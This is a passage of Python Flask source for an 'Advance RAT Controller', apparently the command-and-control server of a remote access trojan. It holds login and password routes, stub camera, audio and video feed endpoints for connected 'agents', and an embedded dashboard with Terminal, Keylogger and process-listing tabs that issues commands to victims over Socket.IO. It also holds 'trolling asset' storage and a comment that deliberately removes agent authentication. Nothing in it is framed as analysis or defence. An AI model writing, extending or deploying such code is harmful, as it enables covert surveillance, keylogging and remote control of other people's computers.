            remaining_attempts = Config.MAX_LOGIN_ATTEMPTS - attempts
            
            if remaining_attempts > 0:
                flash(f'Invalid password. {remaining_attempts} attempts remaining.', 'error')
            else:
                flash(f'Too many failed attempts. Please wait {Config.LOGIN_TIMEOUT} seconds.', 'error')
    
    return render_template_string(login_template, qr_b64=None, secret=None, require_totp=require_totp, enrolled=enrolled, issuer=issuer)

# Serve React index for dashboard and root paths
def _serve_react_index():
    try:
        base_dir = os.path.dirname(__file__)
        candidate_builds = [
            os.path.join(base_dir, 'agent-controller ui v2.1', 'build'),
        ]
        index_path = None
        for b in candidate_builds:
            p = os.path.join(b, 'index.html')
            if os.path.exists(p):
                index_path = p
                break
        if index_path:
            with open(index_path, 'r', encoding='utf-8', errors='replace') as f:
                index_html = f.read()
            runtime_overrides = (
                "<script>"
                "window.__SOCKET_URL__ = window.location.protocol + '//' + window.location.host;"
                "window.__API_URL__ = window.__SOCKET_URL__;"
                "</script>"
            )
            if "</head>" in index_html:
                modified = index_html.replace("</head>", runtime_overrides + "</head>")
            else:
                modified = runtime_overrides + index_html
            return Response(modified, mimetype='text/html')
        else:
            return redirect(url_for('login'))
    except Exception as e:
        print(f"Failed to serve React index: {e}")
        return redirect(url_for('login'))

# Legacy root/dashboard serving handled by index() and dashboard() below

# Logout route
@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

# Video storage configuration
VIDEO_STORAGE_PROVIDER = os.environ.get('VIDEO_STORAGE_PROVIDER')
VIDEO_STORAGE_BUCKET = os.environ.get('VIDEO_STORAGE_BUCKET')
VIDEO_BASE_URL = os.environ.get('VIDEO_BASE_URL')
VIDEO_URL_EXPIRES_IN = int(os.environ.get('VIDEO_URL_EXPIRES_IN', '900'))
ALLOW_UNSIGNED_VIDEO_URLS = os.environ.get('ALLOW_UNSIGNED_VIDEO_URLS', 'false').lower() == 'true'

def _video_key(kind: str, video_id: str) -> str:
    if kind == 'preview':
        return f"videos/previews/{video_id}.mp4"
    if kind == 'mp4':
        return f"videos/mp4/{video_id}_full.mp4"
    return f"videos/hls/{video_id}/master.m3u8"

def _generate_signed_url(key: str) -> Optional[str]:
    provider = (VIDEO_STORAGE_PROVIDER or '').lower()
    if provider == 's3':
        try:
            import boto3
            s3_kwargs = {}
            if os.environ.get('S3_ENDPOINT'):
                s3_kwargs['endpoint_url'] = os.environ.get('S3_ENDPOINT')
            if os.environ.get('AWS_ACCESS_KEY_ID') and os.environ.get('AWS_SECRET_ACCESS_KEY'):
                s3 = boto3.client('s3', **s3_kwargs)
            else:
                s3 = boto3.client('s3', **s3_kwargs)
            return s3.generate_presigned_url(
                ClientMethod='get_object',
                Params={'Bucket': VIDEO_STORAGE_BUCKET, 'Key': key},
                ExpiresIn=VIDEO_URL_EXPIRES_IN
            )
        except Exception as _e:
            return None
    if VIDEO_BASE_URL and ALLOW_UNSIGNED_VIDEO_URLS:
        return f"{VIDEO_BASE_URL.rstrip('/')}/{key}"
    return None

def _is_mobile_user_agent() -> bool:
    ua = request.headers.get('User-Agent', '')
    return bool(re.search(r'(Android|iPhone|iPad|Mobile)', ua, re.IGNORECASE))

def _is_slow_network() -> bool:
    save_data = request.headers.get('Save-Data', '').lower() == 'on'
    ect = request.headers.get('ECT', '').lower()
    return save_data or ect in ('slow-2g', '2g', '3g')

VIDEOS_CATALOG = [
    {'id': 'video123', 'title': 'Demo Short', 'duration': 120},
    {'id': 'video456', 'title': 'Demo Long', 'duration': 3600}
]

@app.route('/api/videos', methods=['GET'])
@require_auth
def list_videos():
    items = []
    for v in VIDEOS_CATALOG:
        vid = v['id']
        preview_key = _video_key('preview', vid)
        mp4_key = _video_key('mp4', vid)
        hls_key = _video_key('hls', vid)
        preview_url = _generate_signed_url(preview_key)
        mp4_url = _generate_signed_url(mp4_key)
        hls_url = _generate_signed_url(hls_key)
        items.append({
            'id': vid,
            'title': v.get('title', vid),
            'duration': v.get('duration', 0),
            'preview_url': preview_url,
            'mp4_url': mp4_url,
            'hls_url': hls_url
        })
    return jsonify({'videos': items})

@app.route('/api/videos/<video_id>/stream-source', methods=['GET'])
@require_auth
def get_video_stream_source(video_id: str):
    video = next((x for x in VIDEOS_CATALOG if x['id'] == video_id), None)
    if not video:
        return jsonify({'error': 'not_found'}), 404
    duration = int(video.get('duration', 0))
    if duration < 900:
        chosen = 'mp4'
    elif _is_mobile_user_agent() or _is_slow_network():
        chosen = 'hls'
    else:
        chosen = 'mp4'
    key = _video_key(chosen, video_id)
    url = _generate_signed_url(key)
    if not url:
        return jsonify({'error': 'signing_unavailable'}), 503
    return jsonify({'type': chosen, 'url': url, 'expires_in': VIDEO_URL_EXPIRES_IN})

# Protected stub endpoints for security tests
@app.route('/stream/<agent_id>')
@require_auth
def stream(agent_id):
    return jsonify({'status': 'protected', 'agent_id': agent_id})

@app.route('/video_feed/<agent_id>')
@require_auth
def video_feed_protected(agent_id):
    return jsonify({'status': 'protected', 'agent_id': agent_id, 'type': 'video'})

@app.route('/camera_feed/<agent_id>')
@require_auth
def camera_feed_protected(agent_id):
    return jsonify({'status': 'protected', 'agent_id': agent_id, 'type': 'camera'})

@app.route('/audio_feed/<agent_id>')
@require_auth
def audio_feed_protected(agent_id):
    return jsonify({'status': 'protected', 'agent_id': agent_id, 'type': 'audio'})

# Configuration status endpoint (for debugging)
@app.route('/config-status')
@require_auth
def config_status():
    """Display current configuration status (for debugging)"""
    s = load_settings().get('security', {})
    return jsonify({
        'admin_password_set': bool(Config.ADMIN_PASSWORD),
        'admin_password_length': len(Config.ADMIN_PASSWORD or ''),
        'secret_key_set': bool(Config.SECRET_KEY),
        'host': Config.HOST,
        'port': Config.PORT,
        'session_timeout': Config.SESSION_TIMEOUT,
        'max_login_attempts': Config.MAX_LOGIN_ATTEMPTS,
        'login_timeout': Config.LOGIN_TIMEOUT,
        'current_login_attempts': len(LOGIN_ATTEMPTS),
        'blocked_ips': [ip for ip, (attempts, _) in LOGIN_ATTEMPTS.items() if attempts >= Config.MAX_LOGIN_ATTEMPTS],
        'blocked_ips_config_count': len(s.get('blocked_ips') or []),
        'password_hash_algorithm': 'PBKDF2-SHA256',
        'hash_iterations': Config.HASH_ITERATIONS,
        'salt_length': Config.SALT_LENGTH
    })

# Password change endpoint
@app.route('/change-password', methods=['POST'])
@require_auth
def change_password():
    """Change the admin password"""
    global ADMIN_PASSWORD_HASH, ADMIN_PASSWORD_SALT
    
    try:
        data = request.get_json()
        current_password = data.get('current_password', '')
        new_password = data.get('new_password', '')
        
        # Verify current password
        if not verify_password(current_password, ADMIN_PASSWORD_HASH, ADMIN_PASSWORD_SALT):
            return jsonify({'success': False, 'message': 'Current password is incorrect'}), 400
        
        # Validate new password
        if len(new_password) < 8:
            return jsonify({'success': False, 'message': 'New password must be at least 8 characters long'}), 400
        
        # Generate new hash for the new password
        new_hash, new_salt = create_secure_password_hash(new_password)
        ADMIN_PASSWORD_HASH = new_hash
        ADMIN_PASSWORD_SALT = new_salt
        
        # Update the config (this will persist for the current session)
        Config.ADMIN_PASSWORD = new_password
        
        return jsonify({'success': True, 'message': 'Password changed successfully'}), 200
        
    except Exception as e:
        return jsonify({'success': False, 'message': f'Error changing password: {str(e)}'}), 500

# --- Web Dashboard HTML (with Socket.IO) ---
DASHBOARD_HTML = r'''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Advance RAT Controller — Best Practices Dashboard</title>

<!-- Fonts & libs -->
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=Orbitron:wght@600;900&display=swap" rel="stylesheet">
<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>

<style>
  :root{
    --bg-1:#070709;         /* deep black */
    --bg-2:#0f1724;         /* dark blue/charcoal */
    --glass: rgba(255,255,255,0.03);
    --glass-2: rgba(255,255,255,0.04);
    --accent-a:#00d4ff;
    --accent-b:#7c5cff;
    --muted:#98a0b3;
    --card-border: rgba(255,255,255,0.04);
  }
  *{box-sizing:border-box}
  html,body{height:100%;margin:0;font-family:"Inter",system-ui,-apple-system,Segoe UI,roboto,"Helvetica Neue",Arial;}
  body{
    background: radial-gradient(1200px 600px at 10% 10%, rgba(30,40,60,0.3), transparent),
                radial-gradient(1000px 600px at 90% 90%, rgba(90,40,120,0.12), transparent),
                linear-gradient(180deg,var(--bg-1),var(--bg-2));
    color:#dbe7ff;
    -webkit-font-smoothing:antialiased;
    overflow:hidden;
  }

  /* Top navbar */
  .top-nav{
    height:68px;
    display:flex;
    align-items:center;
    justify-content:space-between;
    padding:0 22px;
    gap:16px;
    border-bottom:1px solid rgba(255,255,255,0.03);
    backdrop-filter:blur(6px);
    background: linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.00));
    position:relative;
  }
  .brand{
    display:flex;
    align-items:center;
    gap:14px;
  }
  .brand .logo{
    height:44px;width:44px;border-radius:10px;
    background:linear-gradient(135deg,var(--accent-a),var(--accent-b));
    display:flex;align-items:center;justify-content:center;font-weight:800;font-family:Orbitron;
    color:#02111a; box-shadow:0 6px 20px rgba(0,0,0,0.6);
  }
  .brand h1{font-size:1.05rem;margin:0;color:#e8f5ff;font-weight:700}
  .nav-tabs{display:flex;gap:12px;margin-left:20px}
  .nav-tab{
    color:var(--muted); padding:10px 12px; border-radius:8px; font-weight:600; font-size:0.9rem;
    cursor:pointer; transition:all .15s ease;
  }
  .nav-tab.active{
    color:white; background:linear-gradient(90deg, rgba(0,212,255,0.06), rgba(124,92,255,0.05));
    border:1px solid rgba(255,255,255,0.03);
    box-shadow:0 6px 20px rgba(7,22,50,0.5);
  }

  .top-actions{display:flex;align-items:center;gap:12px}
  .top-actions .btn{
    background:transparent;color:var(--muted);border:1px solid rgba(255,255,255,0.03);padding:8px 12px;border-radius:8px;font-weight:600;
  }
  .top-actions .logout{background:linear-gradient(90deg,var(--accent-a),var(--accent-b));padding:9px 14px;border-radius:8px}

  /* Page layout */
  .page{
    display:grid;
    grid-template-columns: 320px 1fr 360px;
    grid-template-rows: auto 1fr;
    gap:16px;
    height: calc(100vh - 68px);
    padding:18px;
  }

  /* Filters row spanning center+right */
  .filters{
    grid-column: 1 / span 3;
    display:flex;gap:12px;align-items:center;padding:12px;border-radius:12px;background:var(--glass-2);
    border:1px solid var(--card-border); margin-bottom:0;
  }
  .filters .filter{padding:10px 12px;border-radius:8px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.02);color:var(--muted);font-weight:600}
  .filters .filter.select{min-width:180px}
  .filters .spacer{flex:1}

  /* Left sidebar */
  .sidebar{
    background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
    border-radius:12px;padding:16px;border:1px solid var(--card-border);overflow:auto;
  }
  .sidebar h3{margin:0 0 12px 0;font-size:0.95rem;color:#fff}
  .agent-list{display:flex;flex-direction:column;gap:10px}
  .agent-item{
    display:flex;align-items:center;justify-content:space-between;padding:12px;border-radius:10px;background:rgba(255,255,255,0.01);
    border:1px solid rgba(255,255,255,0.02); cursor:pointer;
  }
  .agent-item .meta{display:flex;gap:10px;align-items:center}
  .agent-bullet{width:12px;height:12px;border-radius:50%}
  .bullet-online{background:#0ee6a6;box-shadow:0 0 8px rgba(14,230,166,0.12)}
  .bullet-off{background:#ff5c7c}
  .agent-name{font-weight:700;color:#eaf7ff}
  .agent-sub{font-size:0.8rem;color:var(--muted)}

  .controls{margin-top:14px;display:flex;flex-direction:column;gap:10px}
  .control-btn{padding:10px;border-radius:8px;background:transparent;border:1px solid rgba(255,255,255,0.03);color:var(--muted);font-weight:700;cursor:pointer}
  .control-btn.primary{background:linear-gradient(90deg,var(--accent-a),var(--accent-b));color:#02111a;border:none}

  /* Center area */
  .center{
    display:flex;flex-direction:column;gap:14px;padding:6px;overflow:hidden;
  }
  .card{
    border-radius:12px;padding:18px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
    border:1px solid var(--card-border);
  }

  .summary-row{display:grid;grid-template-columns: repeat(3,1fr);gap:14px}
  .summary-card{display:flex;gap:14px;align-items:center}
  .summary-card .chart-wrap{width:100px;height:100px;display:flex;align-items:center;justify-content:center}
  .summary-card .info{flex:1}
  .metric-big{font-size:1.45rem;font-weight:800;color:#fff}
  .metric-sub{color:var(--muted);font-size:0.85rem;margin-top:6px}

  .trend{
    margin-top:6px;height:320px;
  }

  /* Right column */
  .rightcol{display:flex;flex-direction:column;gap:14px;padding:0 6px;overflow:auto}
  .metric-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
  .metric-pill{padding:12px;border-radius:10px;background:rgba(255,255,255,0.01);border:1px solid var(--card-border);text-align:center}
  .metric-pill .v{font-weight:800;font-size:1.3rem;color:#fff}
  .terminal{height:260px;padding:12px;border-radius:10px;background:#071226;border:1px solid rgba(255,255,255,0.02);overflow:auto;font-family:monospace;color:#8ef0c5}

  /* System Overview sections */
  .system-overview{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:10px}
  .overview-section{padding:16px;border-radius:10px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.05)}
  .overview-section h4{margin:0 0 12px 0;color:#fff;font-size:1rem;font-weight:600}
  .info-display{display:flex;flex-direction:column;gap:8px}
  .info-item{display:flex;justify-content:space-between;align-items:center;padding:6px 0}
  .info-item .label{color:var(--muted);font-size:0.9rem}
  .info-item span:last-child{color:#fff;font-weight:500;text-align:right}

  /* Small helpers */
  .muted{color:var(--muted)}
  .small{font-size:0.85rem}
  .kpi{display:flex;gap:8px;align-items:center}
  .kpi .dot{width:10px;height:10px;border-radius:50%}
  .dot-blue{background:var(--accent-a)}
  .dot-purple{background:var(--accent-b)}

  /* responsive */
  @media (max-width:1100px){
    .page{grid-template-columns: 1fr; grid-auto-rows: auto; height:calc(100vh - 68px); overflow:auto}
    .filters{grid-column:1}
  }
</style>
</head>
<body>

  <div class="top-nav">
    <div class="brand">
      <div class="logo">N</div>
      <div style="display:flex;flex-direction:column;line-height:1">
        <h1>Advance Rat Controller</h1>
        <div class="muted small">Agent Live Monitoring</div>
      </div>

      <div class="nav-tabs" style="margin-left:22px">
        <div class="nav-tab active">Overview</div>
        <div class="nav-tab">List Process</div>
        <div class="nav-tab">System Info</div>
        <div class="nav-tab">Terminal</div>
        <div class="nav-tab">Keylogger</div>
        
      </div>
    </div>

    <div class="top-actions">
      <div class="small muted">Agent: <strong style="color:white">45t8ZVUro7QhXlClAAAB</strong></div>
      <a href="/logout" class="logout">Logout</a>
    </div>
  </div>

  <div class="page">

    <!-- FILTERS -->
    <div class="filters">
      <div class="filter select">Device Group: <strong style="margin-left:8px;color:white">Online</strong></div>
      <div class="filter select">Category: <strong style="margin-left:8px;color:white">Security</strong></div>
      <div class="filter">Checks: <strong style="margin-left:8px;color:white">Failed</strong></div>
      <div class="filter">Time Range: <strong style="margin-left:8px;color:white">current</strong></div>
      <div class="spacer"></div>
      <div class="filter small">Export</div>
      <div class="filter small">Refresh</div>
    </div>

    <!-- LEFT -->
    <div class="sidebar card">
      <h3>Active Agents</h3>
      <div class="agent-list" id="agent-list">
        <!-- JS will populate -->
        <div style="text-align:center;padding:26px;color:var(--muted);border-radius:10px;border:1px dashed rgba(255,255,255,0.02)">
          No agents connected
        </div>
      </div>

      <div class="controls">
        <button class="control-btn primary" onclick="getSystemInfo()">Agent Stats</button>
        <button class="control-btn" onclick="getNetworkInfo()">System Health</button>
        <button class="control-btn" onclick="listProcesses()">List Processes</button>
        <button class="control-btn" onclick="refreshOverview()">Refresh Dashboard</button>
      </div>
    </div>

    <!-- CENTER -->
    <div class="center">
      <!-- Summary row -->
      <div class="card summary-row">
        <div class="summary-card">
          <div class="chart-wrap">
            <canvas id="doughnut1" width="100" height="100"></canvas>
          </div>
          <div class="info">
            <div class="metric-big" id="metric1">23</div>
            <div class="metric-sub">Agent Reports</div>
          </div>
        </div>

        <div class="summary-card">
          <div class="chart-wrap">
            <canvas id="doughnut2" width="100" height="100"></canvas>
          </div>
          <div class="info">
            <div class="metric-big" id="metric2">8</div>
            <div class="metric-sub">Agents Status</div>
           
          </div>
        </div>

        <div class="summary-card">
          <div class="chart-wrap">
            <canvas id="doughnut3" width="100" height="100"></canvas>
          </div>
          <div class="info">
            <div class="metric-big" id="metric3">41%</div>
            <div class="metric-sub">Overall Pass Rate</div>
            <div class="small muted">Trend vs previous period</div>
          </div>
        </div>
      </div>

      <!-- Trend chart -->
      <div class="card">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
          <div style="font-weight:700">Controller Status</div>
          <div class="muted small">Last 30 days</div>
        </div>
        <div class="trend">
          <canvas id="trendChart" width="800" height="320"></canvas>
        </div>
      </div>

      <!-- System Overview with Dashboard Metrics -->
      <div style="display:flex;gap:12px">
        <div class="card" style="flex:1">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
            <div style="font-weight:700">System Overview</div>
            <div class="muted small">Real-time monitoring</div>
          </div>
          <div class="system-overview">
            <div class="overview-section">
              <h4>Agent Statistics</h4>
              <div id="agent-stats-display" class="info-display">
                <div class="info-item"><span class="label">Agent Reports:</span> <span id="agent-reports">0</span></div>
                <div class="info-item"><span class="label">Agents Status:</span> <span id="agents-status">26</span></div>
                <div class="info-item"><span class="label">Overall Pass Rate:</span> <span id="pass-rate">57%</span></div>
                <div class="info-item"><span class="label">Trend:</span> <span id="trend-info">vs previous period</span></div>
              </div>
            </div>
            <div class="overview-section">
              <h4>System Health</h4>
              <div id="system-health-display" class="info-display">
                <div class="info-item"><span class="label">Controller Status:</span> <span id="controller-status">Active</span></div>
                <div class="info-item"><span class="label">Monitoring Period:</span> <span id="monitoring-period">Last 30 days</span></div>
                <div class="info-item"><span class="label">System Uptime:</span> <span id="system-uptime">Loading...</span></div>
                <div class="info-item"><span class="label">Last Update:</span> <span id="last-update">Just now</span></div>
              </div>
            </div>
          </div>
        </div>

        <div class="card" style="width:340px">
          <div style="display:flex;justify-content:space-between;align-items:center">
            <div style="font-weight:700">Quick Metrics</div>
            <div class="muted small">Real-time</div>
          </div>

          <div class="metric-grid" style="margin-top:12px">
            <div class="metric-pill"><div class="v" id="m1">12</div><div class="small muted">Active Agents</div></div>
            <div class="metric-pill"><div class="v" id="m2">5</div><div class="small muted">Online Systems</div></div>
            <div class="metric-pill"><div class="v" id="m3">98%</div><div class="small muted">System Health</div></div>
            <div class="metric-pill"><div class="v" id="m4">45ms</div><div class="small muted">Response Time</div></div>
          </div>

          <div style="margin-top:12px;font-weight:700">Output</div>
          <div class="terminal" id="output-terminal">NEURAL_TERMINAL_v2.1 &gt; Waiting for events...</div>
        </div>
      </div>
    </div>

    <!-- RIGHT -->
    <div class="rightcol">
      <div class="card">
        <div style="display:flex;justify-content:space-between;align-items:center">
          <div style="font-weight:700">Config Status</div>
          <div class="muted small">Last updated: <span id="cfg-time">—</span></div>
        </div>
        <div style="margin-top:12px;display:grid;gap:8px">
          <div style="display:flex;justify-content:space-between"><div class="muted">Admin password set</div><div id="cfg1">Yes</div></div>
          <div style="display:flex;justify-content:space-between"><div class="muted">Secret key</div><div id="cfg2">Hidden</div></div>
          <div style="display:flex;justify-content:space-between"><div class="muted">Session timeout</div><div id="cfg3">3600s</div></div>
          <div style="display:flex;justify-content:space-between"><div class="muted">Blocked IPs</div><div id="cfg4">0</div></div>
        </div>
      </div>

      <div class="card">
        <div style="font-weight:700;margin-bottom:8px">Password Management</div>
        <div style="display:flex;flex-direction:column;gap:8px">
          <input id="new-pass" placeholder="New password" style="padding:10px;border-radius:8px;background:transparent;border:1px solid rgba(255,255,255,0.03);color:#fff">
          <button class="control-btn primary" onclick="changePassword()">Change Password</button>
          <div class="small muted">Make sure you are connected via secure channel.</div>
        </div>
      </div>
    </div>

  </div>

<script>
  /* --------- Socket.IO hook (existing server) --------- */
  const socket = io();

  // Example socket events wiring - adapt to your server event names
  socket.on('connect', ()=> {
    appendLog('Socket connected: ' + socket.id);
    updateMetric('m1', '---');
  });

  socket.on('agent_list', data => {
    renderAgentList(data);
  });

  socket.on('terminal_output', data => {
    appendLog(data);
  });

  socket.on('config_status', data => {
    document.getElementById('cfg-time').innerText = new Date().toLocaleTimeString();
    document.getElementById('cfg1').innerText = data.admin_password_set ? 'Yes':'No';
    document.getElementById('cfg3').innerText = data.session_timeout + 's';
    document.getElementById('cfg4').innerText = data.blocked_ips.length;
  });

  /* --------- Render helpers --------- */
  function appendLog(msg){
    const el = document.getElementById('output-terminal');
    el.innerText = (new Date().toLocaleTimeString()) + ' > ' + msg + '\\n' + el.innerText;
  }
  function renderAgentList(list){
    const container = document.getElementById('agent-list');
    container.innerHTML = '';
    if(!list || list.length===0){
      container.innerHTML = '<div style="text-align:center;padding:26px;color:var(--muted);border-radius:10px;border:1px dashed rgba(255,255,255,0.02)">No agents connected</div>';
      return;
    }
    list.forEach(a=>{
      const item = document.createElement('div');
      item.className='agent-item';
      item.innerHTML = `<div class="meta"><div style="display:flex;flex-direction:column"><div class="agent-name">${a.name || a.id}</div><div class="agent-sub">${a.os||'unknown'}</div></div></div><div style="display:flex;align-items:center;gap:8px"><div class="agent-bullet ${a.online?'bullet-online':'bullet-off'}"></div><div class="muted small">${a.id}</div></div>`;
      item.onclick = ()=>{ selectAgent(a.id); };
      container.appendChild(item);
    });
  }
  function selectAgent(id){ document.getElementById('agent-id')?.setAttribute('value', id); appendLog('Selected agent '+id); }

  /* --------- Chart.js: doughnuts + trend --------- */
  const doughnutOpts = {responsive:true, maintainAspectRatio:false, cutout:'70%', plugins:{legend:{display:false}}};

  const d1 = new Chart(document.getElementById('doughnut1').getContext('2d'),{
    type:'doughnut',
    data:{labels:['error','problems','bugs'], datasets:[{data:[60,30,10], backgroundColor:[getColor('--accent-a'), getColor('--accent-b'),'rgba(255,255,255,0.06)'], borderWidth:0}]},
    options:doughnutOpts
  });
  const d2 = new Chart(document.getElementById('doughnut2').getContext('2d'),{
    type:'doughnut',
    data:{labels:['Online','Recently','Offline'], datasets:[{data:[40,30,30], backgroundColor:[getColor('--accent-b'),getColor('--accent-a'),'rgba(255,255,255,0.06)'], borderWidth:0}]},
    options:doughnutOpts
  });
  const d3 = new Chart(document.getElementById('doughnut3').getContext('2d'),{
    type:'doughnut',
    data:{labels:['Pass','Fail'], datasets:[{data:[59,41], backgroundColor:['rgba(0,255,190,0.12)','rgba(255,92,124,0.12)'], borderWidth:0}]},
    options:doughnutOpts
  });

  const trendCtx = document.getElementById('trendChart').getContext('2d');
  const trendChart = new Chart(trendCtx, {
    type: 'line',
    data: {
      labels: Array.from({length:30}, (_,i)=>'Day '+(i+1)),
      datasets: [
        {label:'latency', data: randomSeries(30,40,85), borderColor:getColor('--accent-a'), tension:0.28, pointRadius:2, fill:false},
        {label:'Overall Agents', data: randomSeries(30,20,70), borderColor:getColor('--accent-b'), tension:0.28, pointRadius:2, fill:false},
        {label:'Network', data: randomSeries(30,10,60), borderColor:'#9be8ff', tension:0.28, pointRadius:2, fill:false},
        {label:'Service', data: randomSeries(30,5,55), borderColor:'#7ee3b6', tension:0.28, pointRadius:2, fill:false}
      ]
    },
    options:{
      responsive:true, maintainAspectRatio:false,
      plugins:{legend:{labels:{color:'#cfeaff'}}},
      scales:{
        x:{grid:{display:false}, ticks:{color:'#9fb8d8'}},
        y:{grid:{color:'rgba(255,255,255,0.03)'}, ticks:{color:'#9fb8d8'}}
      }
    }
  });

  function randomSeries(n,min,max){ return Array.from({length:n}, ()=> Math.round(Math.random()*(max-min)+min)); }
  function getColor(varName){
    // read value from CSS variable
    return getComputedStyle(document.documentElement).getPropertyValue(varName) || '#00d4ff';
  }

  /* --------- helpers for updating DOM metrics --------- */
  function updateMetric(id,val){ const el=document.getElementById(id); if(el) el.innerText=val; }
  function appendToEl(id,txt){ const e=document.getElementById(id); if(e) e.innerText += '\\n'+txt; }

  /* --------- Overview and dashboard functions --------- */
  function issueCommand(){ const cmd = document.getElementById('command')?.value || ''; if(cmd) { socket.emit('issue_command', {command:cmd}); appendLog('Issued command: '+cmd);} }
  function listProcesses(){ socket.emit('list_processes'); appendLog('Requested process list'); }
  function getSystemInfo(){ socket.emit('get_agent_stats'); appendLog('Requested agent statistics'); }
  function getNetworkInfo(){ socket.emit('get_system_health'); appendLog('Requested system health'); }
  function refreshOverview(){ socket.emit('refresh_dashboard'); appendLog('Refreshing dashboard data'); }
  
  // Handle agent stats response
  socket.on('agent_stats_response', function(data) {
    if(data.reports) document.getElementById('agent-reports').textContent = data.reports;
    if(data.status) document.getElementById('agents-status').textContent = data.status;
    if(data.pass_rate) document.getElementById('pass-rate').textContent = data.pass_rate;
    if(data.trend) document.getElementById('trend-info').textContent = data.trend;
    appendLog('Agent statistics updated');
  });
  
  // Handle system health response
  socket.on('system_health_response', function(data) {
    if(data.controller_status) document.getElementById('controller-status').textContent = data.controller_status;
    if(data.monitoring_period) document.getElementById('monitoring-period').textContent = data.monitoring_period;
    if(data.uptime) document.getElementById('system-uptime').textContent = data.uptime;
    if(data.last_update) document.getElementById('last-update').textContent = data.last_update;
    appendLog('System health updated');
  });
  
  // Auto-refresh dashboard metrics every 30 seconds
  setInterval(() => {
    refreshOverview();
  }, 30000);
  function changePassword(){
    const p = document.getElementById('new-pass').value;
    if(!p || p.length<8){ alert('Choose password >= 8 chars'); return; }
    fetch('/change-password',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({current_password:'', new_password:p})})
      .then(r=>r.json()).then(j=>{ if(j.success) alert('Password changed'); else alert('Error: '+j.message) }).catch(e=>alert('Error'));
  }

  /* demo: update metrics every 7s */
  setInterval(()=>{ updateMetric('metric1', Math.floor(Math.random()*60)); updateMetric('metric2', Math.floor(Math.random()*40)); updateMetric('metric3', Math.floor(Math.random()*100)+'%'); updateMetric('m1', Math.floor(Math.random()*20)); },7000);

  /* demo: append a start line */
  appendLog('Dashboard ready — waiting for agents');

</script>
</body>
</html>
'''


# In-memory storage for agent data
AGENTS_DATA = defaultdict(lambda: {"sid": None, "last_seen": None})
DOWNLOAD_BUFFERS = defaultdict(lambda: {"chunks": [], "total_size": 0, "local_path": None})
FILE_INFO_WAITERS = {}

def _agents_payload():
    try:
        return {aid: dict(data) for aid, data in AGENTS_DATA.items()}
    except Exception:
        return {}
FILE_RANGE_WAITERS = {}
FILE_THUMB_WAITERS = {}
FILE_FASTSTART_WAITERS = {}
FILE_WAITERS_LOCK = threading.Lock()
FASTSTART_CACHE = {}
FASTSTART_CACHE_LOCK = threading.Lock()
FASTSTART_CACHE_TTL_S = 15 * 60
STREAM_SETTINGS = defaultdict(lambda: {"chunk_size": 1024 * 1024})
FEATURE_FLAGS_DEFAULT = {
    "monitoring_enabled": True,
    "frame_dropping_enabled": False,
    "adaptive_bitrate_enabled": True,
    "last_updated": None,
}
AGENT_FEATURE_FLAGS = defaultdict(lambda: dict(FEATURE_FLAGS_DEFAULT))

MIN_STREAM_CHUNK = 256 * 1024
MAX_STREAM_CHUNK = 8 * 1024 * 1024
FILE_METADATA_CACHE = {}
FILE_METADATA_CACHE_LOCK = threading.Lock()
CACHE_TTL = 300

def get_cached_metadata(agent_id: str, file_path: str):
    key = f"{agent_id}:{file_path}"
    with FILE_METADATA_CACHE_LOCK:
        entry = FILE_METADATA_CACHE.get(key)
        if entry and (time.time() - entry['timestamp']) < CACHE_TTL:
            return entry['data']
    return None

def set_cached_metadata(agent_id: str, file_path: str, data: dict):
    key = f"{agent_id}:{file_path}"
    with FILE_METADATA_CACHE_LOCK:
        FILE_METADATA_CACHE[key] = {
            'data': data,
            'timestamp': time.time()
        }

# Controller-hosted trolling assets (operator uploads -> agent fetch via signed URL)
TROLL_UPLOADS = {}
TROLL_ASSETS = {}

def _get_stream_chunk_size(agent_id: str) -> int:
    try:
        s = STREAM_SETTINGS.get(agent_id) or {}
        cs = int(s.get("chunk_size") or (1024 * 1024))
        return max(MIN_STREAM_CHUNK, min(cs, MAX_STREAM_CHUNK))
    except Exception:
        return 1024 * 1024

def _adjust_stream_chunk_size(agent_id: str, elapsed_s: float, success: bool):
    try:
        current = _get_stream_chunk_size(agent_id)
        if not success:
            new_size = max(MIN_STREAM_CHUNK, current // 2)
        else:
            if elapsed_s < 1.0:
                new_size = min(MAX_STREAM_CHUNK, current * 2)
            elif elapsed_s > 10.0:
                new_size = max(MIN_STREAM_CHUNK, current // 2)
            else:
                new_size = current
        STREAM_SETTINGS[agent_id] = {"chunk_size": new_size}
    except Exception:
        pass

def _faststart_cache_get(agent_id: str, file_path: str):
    try:
        key = f"{agent_id}:{file_path}"
        now = time.time()
        with FASTSTART_CACHE_LOCK:
            entry = FASTSTART_CACHE.get(key)
            if not entry:
                return None
            if (now - float(entry.get('ts') or 0)) > FASTSTART_CACHE_TTL_S:
                FASTSTART_CACHE.pop(key, None)
                return None
            return entry
    except Exception:
        return None

def _faststart_cache_set(agent_id: str, file_path: str, transformed_path: str | None, ok: bool):
    try:
        key = f"{agent_id}:{file_path}"
        with FASTSTART_CACHE_LOCK:
            FASTSTART_CACHE[key] = {
                'path': transformed_path,
                'ok': bool(ok),
                'ts': time.time(),
            }
    except Exception:
        pass

# Remove the agent secret authentication - allow direct agent access
# AGENT_SHARED_SECRET = os.environ.get("AGENT_SHARED_SECRET", "sphinx_agent_secret")

# def require_agent_secret(f):
#     def decorated(*args, **kwargs):
#         if request.headers.get("X-AGENT-SECRET") != AGENT_SHARED_SECRET:
#             return "Forbidden", 403
#         return f(*args, **kwargs)
#     decorated.__name__ = f.__name__
#     return decorated

# --- Operator-facing endpoints ---

@app.route("/")
